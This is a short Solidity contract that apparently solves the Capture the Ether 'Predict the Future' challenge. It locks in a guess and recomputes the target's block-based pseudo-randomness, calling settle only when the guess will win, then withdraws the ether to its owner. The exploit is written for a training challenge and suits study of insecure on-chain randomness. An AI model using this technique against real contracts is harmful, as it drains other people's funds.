pragma solidity ^0.4.21;

import "./predict_the_future.sol";

contract PredictTheFutureSolver {
	address owner;

	function PredictTheFutureSolver() public {
		owner = msg.sender;
	}

	function lockInGuess(address _addr, uint8 n) public payable{
		require(msg.value == 1 ether);
		PredictTheFutureChallenge challenge = PredictTheFutureChallenge(_addr);
		challenge.lockInGuess.value(msg.value)(n);
	}

	function settle(address _addr, uint8 n) public payable {
		uint8 num = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

		if(num == n) {
			PredictTheFutureChallenge challenge = PredictTheFutureChallenge(_addr);
			challenge.settle();
			withdraw();
		}
	}
	
	function () public payable {  }

	function withdraw() public {
		require(msg.sender == owner);
		owner.transfer(address(this).balance);
	}
}
